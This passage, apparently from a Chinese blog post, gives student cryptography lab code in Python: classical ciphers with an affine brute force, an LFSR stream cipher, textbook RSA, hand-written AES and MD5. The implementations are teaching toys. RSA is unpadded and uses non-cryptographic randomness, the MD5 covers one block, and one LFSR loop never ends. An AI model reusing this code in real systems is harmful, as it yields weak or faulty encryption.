        <id>https://zyyiszyy.github.io/post/mi-ma-xue-shi-yan-shi-yan-dai-ma/</id>
        <link href="https://zyyiszyy.github.io/post/mi-ma-xue-shi-yan-shi-yan-dai-ma/">
        </link>
        <updated>2021-01-13T11:32:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="古典密码-vignere">古典密码 Vignere</h2>
<p>加密代码：</p>
<pre><code class="language-python">k=input(&quot;请输入密钥：&quot;)
m=input(&quot;请输入明文：&quot;)
c=''
lk=len(k)
temp=0
for i in range(len(m)):
    if not ((ord(m[i])&gt;=65 and ord(m[i])&lt;=90) or (ord(m[i])&gt;=97 and ord(m[i])&lt;=122)): #字母外不加密
        c+=m[i]
    else:
        if ord(m[i])&gt;=97 and ord(m[i])&lt;=122:          #判断明文大小写，对应密文大小写
            if ord(k[temp%lk])&gt;=97 and ord(k[temp%lk])&lt;=122:         #判断密钥大小写
                c+=chr(((ord(m[i])-97)+(ord(k[temp%lk])-97))%26+97)
                temp+=1
            else:
                c+=chr(((ord(m[i])-97)+(ord(k[temp%lk])-65))%26+97)
                temp+=1
        else:
            if ord(k[temp%lk])&gt;=97 and ord(k[temp%lk])&lt;=122:
                c+=chr(((ord(m[i])-65)+(ord(k[temp%lk])-97))%26+65)
                temp+=1
            else:
                c+=chr(((ord(m[i])-65)+(ord(k[temp%lk])-65))%26+65)
                temp+=1
print(&quot;维吉尼亚密码加密结果为：&quot;,c)

</code></pre>
<p>解密代码：</p>
<pre><code class="language-python">k=input(&quot;请输入密钥：&quot;)
c=input(&quot;请输入密文：&quot;)
m=''
lk=len(k)
temp=0
for i in range(len(c)):
    if not ((ord(c[i])&gt;=65 and ord(c[i])&lt;=90) or (ord(c[i])&gt;=97 and ord(c[i])&lt;=122)):   #字母外不加密
        m+=c[i]
    else:
        if ord(c[i])&gt;=97 and ord(c[i])&lt;=122:          #判断密文大小写，对应明文大小写
            if ord(k[temp%lk])&gt;=97 and ord(k[temp%lk])&lt;=122:         #判断密钥大小写
                m+=chr(((ord(c[i])-97)-(ord(k[temp%lk])-97))%26+97)
                temp+=1
            else:
                m+=chr(((ord(c[i])-97)-(ord(k[temp%lk])-65))%26+97)
                temp+=1
        else:
            if ord(k[temp%lk])&gt;=97 and ord(k[temp%lk])&lt;=122:
                m+=chr(((ord(c[i])-65)-(ord(k[temp%lk])-97))%26+65)
                temp+=1
            else:
                m+=chr(((ord(c[i])-65)-(ord(k[temp%lk])-65))%26+65)
                temp+=1
print(&quot;维吉尼亚密码解密结果为：&quot;,m)
</code></pre>
<p>结果展示：<br>
<img src="https://zyyiszyy.github.io/post-images/1615259738997.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615259745611.png" alt="" loading="lazy"></p>
<h2 id="古典密码-仿射密码">古典密码 仿射密码</h2>
<p>加密代码：</p>
<pre><code class="language-python">m=''
c=''
k1=int(input(&quot;请输入k1：&quot;))
k2=int(input(&quot;请输入k2：&quot;))
m=input(&quot;请输入明文m：&quot;)
for i in range(len(m)):
    if m[i]==' ':
        c+=' '
    else:
        c+=chr((k1*(ord(m[i])-97)+k2)%26+97)
print(&quot;仿射加密后的密文c为：&quot;,c)
</code></pre>
<p>解密代码：</p>
<pre><code class="language-python">c=''
m=''
k1_=int(input(&quot;请输入k1逆：&quot;))
k2_=int(input(&quot;请输入k2：&quot;))
c=input(&quot;请输入密文c：&quot;)
for i in range(len(c)):
    if c[i]==' ':
        m+=' '
    else:
        m+=chr(((ord(c[i])-97-k2_)*k1_)%26+97)
print(&quot;仿射解密的明文为：&quot;,m)
</code></pre>
<p>仿射密码爆破解密：</p>
<pre><code class="language-python">a=[1,3,5,7,9,11,15,17,19,21,23,25]
c='xrgti'
str=''
for k2 in range(26):
    for k1 in a:
        for ci in range(len(c)):
                k=chr((((ord(c[ci])-97-k2)*k1)%26)+97)
                str+=k
        if len(str)==len(c):
            print(str,k1,k2)
            str=''
</code></pre>
<p>结果展示：<br>
<img src="https://zyyiszyy.github.io/post-images/1615260045833.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615260052358.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615260058782.png" alt="" loading="lazy"></p>
<h2 id="流密码与线性反馈移位寄存器">流密码与线性反馈移位寄存器</h2>
<p>**线性反馈移位寄存器LFSR：**先找到一个本原多项式，选取初始化向量vi，依照本原多项式去除对应的位进行异或，作为输入，再将对应端作为输出，这样便得到周期位2^n-1的01序列。验证周期时，只需要将LFSR内容和初始值判断相等，相等时满一个周期。<br>
**简单流密码的实现：**选取初始值后，将明文按照一定的编码方式转换成比特流，依次和上面产生的01序列进行异或，所得为密文比特流。解密时保持LFSR线性移位反馈寄存器不变，初始值向量也不变，再对密文依次异或即为原来的明文比特流，再按同样的编码方式转换成明文即可解密成功。<br>
LFSR线性反馈移位寄存器：</p>
<pre><code class="language-python">#选取的本原多项式x^15+x+1         32768-1
#取初始值0x1               
LFSR=int('0x1',16)
print(&quot;移位寄存器的内容：&quot;,bin(LFSR)[2:].zfill(15),end='           ')
t=50
while(t):
    bit_out=LFSR&amp;1
    print(&quot;移出的位：&quot;,bit_out,end=' ')
    bit_in=((LFSR&amp;0x4000)&gt;&gt;14)^((LFSR&amp;0x1))
    print(&quot;移入的位：&quot;,bit_in)
    LFSR=(LFSR&gt;&gt;1)+(bit_in&lt;&lt;14)
    print(&quot;移位寄存器的内容：&quot;,bin(LFSR)[2:].zfill(15),end='           ')
t-=1
</code></pre>
<p>LFSR的周期验证:</p>
<pre><code class="language-python">#选取的本原多项式x^15+x+1         32768-1
#取初始值0x1                
LFSR=int('0x1',16)
#print(&quot;移位寄存器的内容：&quot;,bin(LFSR)[2:].zfill(15),end='           ')
t=0
while(1):
    bit_out=LFSR&amp;1
    #print(&quot;移出的位：&quot;,bit_out,end=' ')
    bit_in=((LFSR&amp;0x4000)&gt;&gt;14)^((LFSR&amp;0x1))
    #print(&quot;移入的位：&quot;,bit_in)
    LFSR=(LFSR&gt;&gt;1)+(bit_in&lt;&lt;14)
    t+=1
    if LFSR==1:
        print(&quot;移位寄存器的内容：&quot;,bin(LFSR)[2:].zfill(15),end='           ')
        print(t)
        break
</code></pre>
<p>流密码加密：</p>
<pre><code class="language-python">#选取的本原多项式x^24+x^7+x^2+x+1      0x800043
#取初始值0xabcdef                10101011 11001101 11101111
import re
def Str_encode(s:str,rule='utf-8'):
    #返回字符串对应01字符串
    sc=s.encode(rule)
    bc=[bin(int(i))[2:].rjust(8,'0') for i in sc ]
    rtn=''.join(bc)
    return rtn
LFSR=int('0xabcdef',16)
#print(&quot;移位寄存器的内容：&quot;,bin(LFSR),end='           ')
c=''
m=Str_encode(input(&quot;请输入明文m：&quot;))
print('明文转化为01比特流：',m)
for i in range(len(m)):
    bit_out=LFSR&amp;1
    #print(&quot;移出的位：&quot;,bit_out,end=' ')
    bit_in=((LFSR&amp;0x800000)&gt;&gt;23)^((LFSR&amp;0x40)&gt;&gt;6)^((LFSR&amp;0x2)&gt;&gt;1)^(LFSR&amp;1)
    #print(&quot;移入的位：&quot;,bit_in)
    LFSR=(LFSR&gt;&gt;1)+(bit_in&lt;&lt;23)
    #print(&quot;移位寄存器的内容：&quot;,bin(LFSR),end='           ')
    c+=chr(bit_out^int(m[i])+48)
print(&quot;加密后的比特流为：&quot;,(c))
</code></pre>
<p>流密码解密：</p>
<pre><code class="language-python">import re
def Str_decode(s:str,rule='utf-8'):
    if len(s)%8!=0:
        raise SyntaxError('编码不是八的倍数')
        #至少是字节的倍数才能操作
    msg=re.sub(r'0x','',hex(int(s,2)))
    rtn=bytes.fromhex(msg).decode(rule)
    return rtn
LFSR=int('0xabcdef',16)
#print(&quot;移位寄存器的内容：&quot;,bin(LFSR),end='           ')
c=''
m=input(&quot;请输入密文比特流c：&quot;)
for i in range(len(m)):
    bit_out=LFSR&amp;1
    #print(&quot;移出的位：&quot;,bit_out,end=' ')
    bit_in=((LFSR&amp;0x800000)&gt;&gt;23)^((LFSR&amp;0x40)&gt;&gt;6)^((LFSR&amp;0x2)&gt;&gt;1)^(LFSR&amp;1)
    #print(&quot;移入的位：&quot;,bit_in)
    LFSR=(LFSR&gt;&gt;1)+(bit_in&lt;&lt;23)
    #print(&quot;移位寄存器的内容：&quot;,bin(LFSR),end='           ')
    c+=chr(bit_out^int(m[i])+48)
print(Str_decode(c))
</code></pre>
<p>结果展示：<br>
<img src="https://zyyiszyy.github.io/post-images/1615260475492.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615260482522.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615260488961.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615260493087.png" alt="" loading="lazy"></p>
<h2 id="公钥密码-rsa">公钥密码 RSA</h2>
<p>**密钥生成原理：**1.随机选择两个不相等的质数p和q。<br>
2.计算p和q的乘积n：n = p×q<br>
3.计算n的欧拉函数φ(n)。称作L。根据公式φ(n) = (p-1)(q-1)。<br>
4.随机选择一个整数e，也就是公钥当中用来加密的那个数字条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质。<br>
5.计算e对于φ(n)的模反元素，也就是密钥当中用来解密的那个数字。<br>
6.将n和e封装成公钥，n和d封装成私钥。<br>
**加解密原理：**加密算法为：c≡ m^e mod n;解密算法为：m≡ c^d mod n。<br>
实验代码：</p>
<pre><code class="language-python">import random
from Crypto.Util.number import *
# 检测大整数是否是素数,如果是素数,就返回True,否则返回False
# rabin算法
def rabin_miller(num):
    s = num - 1
    t = 0
    while s % 2 == 0:
        s = s // 2
        t += 1
    for trials in range(5):
        a = random.randrange(2, num - 1)
        v = fast_mod(a, s, num)
        if v != 1:
            i = 0
            while v != (num - 1):
                if i == t - 1:
                    return False
                else:
                    i = i + 1
                    v = (v ** 2) % num
    return True
def is_prime(num):
    small_primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643, 647, 653, 659, 661, 673, 677, 683, 691, 701, 709, 719, 727, 733, 739, 743, 751, 757, 761, 769, 773, 787, 797, 809, 811, 821, 823, 827, 829, 839, 853, 857, 859, 863, 877, 881, 883, 887, 907, 911, 919, 929, 937, 941, 947, 953, 967, 971, 977, 983, 991, 997]
    # 如果大数是这些小素数的倍数,那么就是合数,返回false
    for prime in small_primes:
        if num % prime == 0:
            return False
    # 如果这样没有分辨出来,就一定是大整数,那么就调用rabin算法
    return rabin_miller(num)
# 得到大整数,默认位数为1024
def get_prime(key_size):
    while True:
        num = random.randrange(2**(key_size-1), 2**key_size)
        if is_prime(num):
            return num
def get_e(size,phi):
    while True:
        num = random.randrange(2**(size-1), 2**size)      
        if gcd(num,phi)==1:
            return num
def gcd(a,b):               #欧几里得法求最大公因数
    if b==0:
        return a
    else:
        return gcd(b, a%b)
def ext_gcd(a, b): #扩展欧几里得算法    
    if b == 0:          
        return 1, 0, a     
    else:         
        x, y, gcd = ext_gcd(b, a % b) #递归直至余数等于0     
        x, y = y, (x - (a // b) * y) #辗转相除法反向推导每层a、b的因子使得gcd(a,b)=ax+by成立         
        return x, y, gcd

def fast_mod(b, n, m):
    #快速幂
    ret = 1
    tmp = b
    while n:
        if n &amp; 0x1:
            ret = ret * tmp % m
        tmp = tmp * tmp % m
        n &gt;&gt;= 1
    return ret
def generate_d(ph_n, e):
    (x, y, r) = ext_gcd(ph_n, e)
    # y maybe &lt; 0, so convert it
    if y &lt; 0:
        #return y % ph_n
        return y + ph_n  
    return y
p=get_prime(512)
q=get_prime(512)
print(&quot;大素数P为：&quot;,p)
print(&quot;大素数Q为：&quot;,q)
n=p*q
print(&quot;N为：&quot;,n)
phi=(p-1)*(q-1)
e=get_e(512,phi)             #e和phi互素
print(&quot;选取的e为：&quot;,e)
d=generate_d(phi,e)     #拓展欧几里得算法求逆
print(&quot;计算的d为：&quot;,d)
m=bytes(input(&quot;请输入明文：&quot;),'utf-8')
print(m)
c=fast_mod(bytes_to_long(m),e,n)
print(&quot;对应的密文为：&quot;,(c))
m=fast_mod(c,d,n)
print(&quot;解密的明文为：&quot;,str(long_to_bytes(m),&quot;utf-8&quot;))
#hello world!
</code></pre>
<p>结果展示：<br>
<img src="https://zyyiszyy.github.io/post-images/1615260876516.png" alt="" loading="lazy"></p>
<h2 id="分组密码-aes">分组密码 AES</h2>
<p>加密流程图：<br>
<img src="https://zyyiszyy.github.io/post-images/1615260956579.png" alt="" loading="lazy"><br>
实验代码：</p>
<pre><code class="language-python">#128位密钥，十轮
sbox=( 0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
            0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
            0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
            0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
            0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
            0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
            0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
            0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
            0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
            0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
            0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
            0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
            0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
            0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
            0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
            0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16 )
#xtime process    与2相乘  若最高位b7=0，最简，若b7=1，和0b100011011异或
def xtime(x):
    if((x&lt;&lt;1)&amp;0x100):
        return (((x&lt;&lt;1)^0x11b))
    return x&lt;&lt;1
    
#MixColumns: Process the entire block   列混合
def MixColumns():
    tmp=[0 for t in range(4)]
    xt=[0 for q in range(4)]
    n=0       #4次循环
    for _ in range(4):
        xt[0]=xtime(blk[n])               #每列xtime运算，乘0x2
        xt[1]=xtime(blk[n+1])
        xt[2]=xtime(blk[n+2])
        xt[3]=xtime(blk[n+3])
        tmp[0]=xt[0]^xt[1]^blk[n+1]^blk[n+2]^blk[n+3]
        tmp[1]=blk[n]^xt[1]^xt[2]^blk[n+2]^blk[n+3]
        tmp[2]=blk[n]^blk[n+1]^xt[2]^xt[3]^blk[n+3]
        tmp[3]=xt[0]^blk[n]^blk[n+1]^blk[n+2]^xt[3]
        blk[n]=tmp[0]                    #仍用blk存结果
        blk[n+1]=tmp[1]
        blk[n+2]=tmp[2]
        blk[n+3]=tmp[3]
        n=n+4
#ShiftRows:Shifts the entire block  行移位
def ShiftRows():
    #第二行左移一位
    t=blk[1]
    blk[1]=blk[5]
    blk[5]=blk[9]
    blk[9]=blk[13]
    blk[13]=t
    #第三行左移两位
    t=blk[2]
    blk[2]=blk[10]
    blk[10]=t
    t=blk[6]
    blk[6]=blk[14]
    blk[14]=t
    #第四行右移一位
    t=blk[15]
    blk[15]=blk[11]
    blk[11]=blk[7]
    blk[7]=blk[3]
    blk[3]=t
#SubBytes  字节代换
def SubBytes():
    for x in range(16):
        blk[x]=sbox[blk[x]]
#AddRoundKey  轮密钥加
def AddRoundKey(key):
    x=0
    k=[0 for m in range(16)]
    for c in range(4):
        for r in range(4):
            k[x]=key[r][c]
            x=x+1
    for y in range(16):
        blk[y]^=int(k[y])
        
# Schedule a secret key for use.
def ScheduleKey(w,Nk):
    Rcon=[0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]
    for r in range(4):
        for c in range(4):
            w[0][r][c]=key[r+c*4]
    for i in range(1,10+1):#问题1
        for j in range(Nk):
            t=[0 for x in range(4)]
            for r in range(4):
                if j :
                    t[r]=w[i][r][j-1]
                else:
                    t[r]=w[i-1][r][3]
            if j==0:
                temp=t[0]
                for r in range(3):
                    t[r]=sbox[t[(r+1)%4]]
                t[3]=sbox[temp]
                t[0]^=int(Rcon[i-1])
            for r in range(4):
                w[i][r][j]=w[i-1][r][j]^t[r]
#加密函数
def AesEncrypt():
    outkey=[]
    outkey=[[[0 for  col in range(4)] for row in range(4)] for s in range(11)]
    ScheduleKey(outkey,4)
    AddRoundKey(outkey[0])
    for x in range(1,10):
        SubBytes()
        ShiftRows()
        MixColumns()
        AddRoundKey(outkey[x])
    SubBytes()
    ShiftRows()                                 #最后一轮没有列混合
    AddRoundKey(outkey[10])
    c=&quot;&quot;
    for i in range(16):
        xxl=hex(blk[i])
        if len(xxl)==3:                  #如0x05，要输出‘05’而不是‘5’
            c+='0'+xxl[2:]
        else:
            c+=xxl[2:]
    print(&quot;AES加密的密文为:&quot;,c)
    return blk
    
def StringToListN(string):
    s=[0 for x in range(16)]    #列表解析，创建16元素0的列表
    for x in range(len(string)):
        s[x]=int(ord(string[x]))
    return s

if __name__==&quot;__main__&quot;:
    m=input(&quot;请输入明文字符串:&quot;)
    blk=StringToListN(m)
    k=input(&quot;请输入秘钥:&quot;)
    key=StringToListN(k)
AesEncrypt()
</code></pre>
<p>ECB电子密码本模式，主要是增加一个明文分组，每次处理一组：<br>
<img src="https://zyyiszyy.github.io/post-images/1615261161526.png" alt="" loading="lazy"><br>
CBC密码分组链接模式，上一个分组的密文和下一组明文异或成为下一组的输入，依次直到所有明文分组加密完毕：<br>
<img src="https://zyyiszyy.github.io/post-images/1615261236667.png" alt="" loading="lazy"></p>
<h2 id="hash-算法md5">HASH 算法md5</h2>
<p>实验代码：</p>
<pre><code class="language-python">import math
#定义初始向量abcd,转换成32位2进制
A0 = '67452301'
B0 = 'efcdab89'
C0 = '98badcfe'
D0 = '10325476'
A0 = bin(int(A0, 16)).replace('0b', '')
B0 = bin(int(B0, 16)).replace('0b', '')
C0 = bin(int(C0, 16)).replace('0b', '')
D0 = bin(int(D0, 16)).replace('0b', '')
A0 = '0' + A0
D0 = '000' + D0

#定义第1-64个式子的第i个32比特常数
y = {}
for i in range(0, 64):
    y[i] = hex(int(2**32*abs(math.sin(i+1)))).replace('0x', '')    # 转成64位
    y[i] = bin(int(y[i], 16)).replace('0b', '')     # 将16进制转换成2进制且补足32位
    if len(y[i]) &lt; 32:
        for t in range(0, 32-len(y[i])):
            y[i] = '0' + y[i]
#实现x,y的逐比特与
def and1(x, y):
    z = ''
    for i in range(0, len(x)):
        if x[i:i+1] == '1' and y[i:i+1] == '1':
            z = z + '1'
        else:
            z = z + '0'
    return z
 
# 实现x,y的逐比特或
def or1(x, y):
    z = ''
    for i in range(0, len(x)):
        if x[i:i+1] == '0' and y[i:i+1] == '0':
            z = z + '0'
        else:
            z = z + '1'
    return z
 
# 实现x,y的逐比特异或
def xor(x, y):
    z = ''
    for i in range(0, len(x)):
        if x[i:i + 1] == y[i:i + 1]:
            z = z + '0'
        else:
            z = z + '1'
    return z
 
# 实现x的逐比特逻辑反
def reverse(x):
    z = ''
    for i in range(0, len(x)):
        if x[i:i + 1] == '1':
            z = z + '0'
        else:
            z = z + '1'
    return z
 
#x的循环左移
def shift(x, i):
    z = ''
    for t in range(0, len(x) - i):
        z = z + x[t + i:t + i + 1]
    for y in range(0, i):
        z = z + x[y:y + 1]
    return z

#整数模2的三十二次方加法
def add(x, y):
    z = ''
    jinwei = 0
    for t in range(1, len(x)):
        if int(x[len(x) - t]) + int(y[len(y) - t]) + jinwei &gt; 1:
            z = str((int(x[len(x) - t]) + int(y[len(y) - t]) + jinwei) % 2) + z
            jinwei = 1
        else:
            z = str((int(x[len(x) - t]) + int(y[len(y) - t]) + jinwei) % 2) + z
            jinwei = 0
    if int(x[0]) + int(y[0]) + jinwei == 2 or int(x[0]) + int(y[0]) + jinwei == 0:
        z = '0' + z
    else:
        z = '1' + z
    return z

# 定义f,g,h,i函数
def ffunc(x, y, z):
    t = and1(x, y)
    t1 = reverse(x)
    t2 = and1(t1, z)
    return or1(t, t2)
def gfunc(x, y, z):
    t = and1(x, z)
    t1 = reverse(z)
    t2 = and1(y, t1)
    return or1(t, t2)
def hfunc(x, y, z):
    t1 = xor(x, y)
    t2 = xor(t1, z)
    return t2
def ifunc(x, y, z):
    t = reverse(z)
    t1 = or1(x, t)
    return xor(y, t1)
#填充算法
def fill(text):
    text1 = ''
    for i in text:
        t = str(ord(i))
        t = bin(int(t, 10)).replace(&quot;0b&quot;, &quot;&quot;)
        t = str(t)
        if len(t) &lt; 8:
            for num in range(8 - len(t)):
                t = '0' + t
        text1 = text1 + t
    length = len(text1)
    length1 = 512 - len(text1) - 65
    text1 = text1 + '1'
    for i in range(length1):
        text1 = text1 + '0'
    text2 = bin(length).replace('0b', '')
    # 填充后面64位
    if len(text2) &lt; 8:
        for i in range(8 - len(text2)):
            text2 = '0' + text2
    length2 = 64 - len(text2)
    for t in range(length2):
        text2 = text2 + '0'
    return text1 + text2
# 将最后得到的ABCD逆序输出
def reverse_order(a):
    new_a = a[24:32] + a[16:24] + a[8:16] + a[0:8]
    return new_a
#最后开始写算法:
# 输入要加密的明文
password = input(&quot;加密前:&quot;)
# 填充算法
x = fill(password)
# 处理数据,注意大端序和小端序
M0 = x[0:32]
M0 = M0[24:32]+M0[16:24]+M0[8:16]+M0[0:8]
M1 = x[32:64]
M1 = M1[24:32]+M1[16:24]+M1[8:16]+M1[0:8]
M2 = x[64:96]
M2 = M2[24:32]+M2[16:24]+M2[8:16]+M2[0:8]
M3 = x[96:128]
M3 = M3[24:32]+M3[16:24]+M3[8:16]+M3[0:8]
M4 = x[128:160]
M4 = M4[24:32]+M4[16:24]+M4[8:16]+M4[0:8]
M5 = x[160:192]
M5 = M5[24:32]+M5[16:24]+M5[8:16]+M5[0:8]
M6 = x[192:224]
M6 = M6[24:32]+M6[16:24]+M6[8:16]+M6[0:8]
M7 = x[224:256]
M7 = M7[24:32]+M7[16:24]+M7[8:16]+M7[0:8]
M8 = x[256:288]
M8 = M8[24:32]+M8[16:24]+M8[8:16]+M8[0:8]
M9 = x[288:320]
M9 = M9[24:32]+M9[16:24]+M9[8:16]+M9[0:8]
M10 = x[320:352]
M10 = M10[24:32]+M10[16:24]+M10[8:16]+M10[0:8]
M11 = x[352:384]
M11 = M11[24:32]+M11[16:24]+M11[8:16]+M11[0:8]
M12 = x[384:416]
M12 = M12[24:32]+M12[16:24]+M12[8:16]+M12[0:8]
M13 = x[416:448]
M13 = M13[24:32]+M13[16:24]+M13[8:16]+M13[0:8]
M14 = x[448:480]
M14 = M14[24:32]+M14[16:24]+M14[8:16]+M14[0:8]
M15 = x[480:512]
M15 = M15[24:32]+M15[16:24]+M15[8:16]+M15[0:8]

#主函数 
# md5第一步
A = A0
B = B0
C = C0
D = D0
 
# md5第二步
AA = A
BB = B
CC = C
DD = D
 
# md5第三步
# 第一轮
A = add(B, shift(add(A, add(add(ffunc(B, C, D), M0), y[0])), 7))
D = add(A, shift(add(D, add(add(ffunc(A, B, C), M1), y[1])), 12))
C = add(D, shift(add(C, add(add(ffunc(D, A, B), M2), y[2])), 17))
B = add(C, shift(add(B, add(add(ffunc(C, D, A), M3), y[3])), 22))
 
A = add(B, shift(add(A, add(add(ffunc(B, C, D), M4), y[4])), 7))
D = add(A, shift(add(D, add(add(ffunc(A, B, C), M5), y[5])), 12))
C = add(D, shift(add(C, add(add(ffunc(D, A, B), M6), y[6])), 17))
B = add(C, shift(add(B, add(add(ffunc(C, D, A), M7), y[7])), 22))
 
A = add(B, shift(add(A, add(add(ffunc(B, C, D), M8), y[8])), 7))
D = add(A, shift(add(D, add(add(ffunc(A, B, C), M9), y[9])), 12))
C = add(D, shift(add(C, add(add(ffunc(D, A, B), M10), y[10])), 17))
B = add(C, shift(add(B, add(add(ffunc(C, D, A), M11), y[11])), 22))
 
A = add(B, shift(add(A, add(add(ffunc(B, C, D), M12), y[12])), 7))
D = add(A, shift(add(D, add(add(ffunc(A, B, C), M13), y[13])), 12))
C = add(D, shift(add(C, add(add(ffunc(D, A, B), M14), y[14])), 17))
B = add(C, shift(add(B, add(add(ffunc(C, D, A), M15), y[15])), 22))
 
# 第二轮
A = add(B, shift(add(A, add(add(gfunc(B, C, D), M1), y[16])), 5))
D = add(A, shift(add(D, add(add(gfunc(A, B, C), M6), y[17])), 9))
C = add(D, shift(add(C, add(add(gfunc(D, A, B), M11), y[18])), 14))
B = add(C, shift(add(B, add(add(gfunc(C, D, A), M0), y[19])), 20))
 
A = add(B, shift(add(A, add(add(gfunc(B, C, D), M5), y[20])), 5))
D = add(A, shift(add(D, add(add(gfunc(A, B, C), M10), y[21])), 9))
C = add(D, shift(add(C, add(add(gfunc(D, A, B), M15), y[22])), 14))
B = add(C, shift(add(B, add(add(gfunc(C, D, A), M4), y[23])), 20))
 
A = add(B, shift(add(A, add(add(gfunc(B, C, D), M9), y[24])), 5))
D = add(A, shift(add(D, add(add(gfunc(A, B, C), M14), y[25])), 9))
C = add(D, shift(add(C, add(add(gfunc(D, A, B), M3), y[26])), 14))
B = add(C, shift(add(B, add(add(gfunc(C, D, A), M8), y[27])), 20))
 
A = add(B, shift(add(A, add(add(gfunc(B, C, D), M13), y[28])), 5))
D = add(A, shift(add(D, add(add(gfunc(A, B, C), M2), y[29])), 9))
C = add(D, shift(add(C, add(add(gfunc(D, A, B), M7), y[30])), 14))
B = add(C, shift(add(B, add(add(gfunc(C, D, A), M12), y[31])), 20))
 
# 第三轮
A = add(B, shift(add(A, add(add(hfunc(B, C, D), M5), y[32])), 4))
D = add(A, shift(add(D, add(add(hfunc(A, B, C), M8), y[33])), 11))
C = add(D, shift(add(C, add(add(hfunc(D, A, B), M11), y[34])), 16))
B = add(C, shift(add(B, add(add(hfunc(C, D, A), M14), y[35])), 23))
 
A = add(B, shift(add(A, add(add(hfunc(B, C, D), M1), y[36])), 4))
D = add(A, shift(add(D, add(add(hfunc(A, B, C), M4), y[37])), 11))
C = add(D, shift(add(C, add(add(hfunc(D, A, B), M7), y[38])), 16))
B = add(C, shift(add(B, add(add(hfunc(C, D, A), M10), y[39])), 23))
 
A = add(B, shift(add(A, add(add(hfunc(B, C, D), M13), y[40])), 4))
D = add(A, shift(add(D, add(add(hfunc(A, B, C), M0), y[41])), 11))
C = add(D, shift(add(C, add(add(hfunc(D, A, B), M3), y[42])), 16))
B = add(C, shift(add(B, add(add(hfunc(C, D, A), M6), y[43])), 23))
 
A = add(B, shift(add(A, add(add(hfunc(B, C, D), M9), y[44])), 4))
D = add(A, shift(add(D, add(add(hfunc(A, B, C), M12), y[45])), 11))
C = add(D, shift(add(C, add(add(hfunc(D, A, B), M15), y[46])), 16))
B = add(C, shift(add(B, add(add(hfunc(C, D, A), M2), y[47])), 23))
 
# 第四轮
A = add(B, shift(add(A, add(add(ifunc(B, C, D), M0), y[48])), 6))
D = add(A, shift(add(D, add(add(ifunc(A, B, C), M7), y[49])), 10))
C = add(D, shift(add(C, add(add(ifunc(D, A, B), M14), y[50])), 15))
B = add(C, shift(add(B, add(add(ifunc(C, D, A), M5), y[51])), 21))
 
A = add(B, shift(add(A, add(add(ifunc(B, C, D), M12), y[52])), 6))
D = add(A, shift(add(D, add(add(ifunc(A, B, C), M3), y[53])), 10))
C = add(D, shift(add(C, add(add(ifunc(D, A, B), M10), y[54])), 15))
B = add(C, shift(add(B, add(add(ifunc(C, D, A), M1), y[55])), 21))
 
A = add(B, shift(add(A, add(add(ifunc(B, C, D), M8), y[56])), 6))
D = add(A, shift(add(D, add(add(ifunc(A, B, C), M15), y[57])), 10))
C = add(D, shift(add(C, add(add(ifunc(D, A, B), M6), y[58])), 15))
B = add(C, shift(add(B, add(add(ifunc(C, D, A), M13), y[59])), 21))
 
A = add(B, shift(add(A, add(add(ifunc(B, C, D), M4), y[60])), 6))
D = add(A, shift(add(D, add(add(ifunc(A, B, C), M11), y[61])), 10))
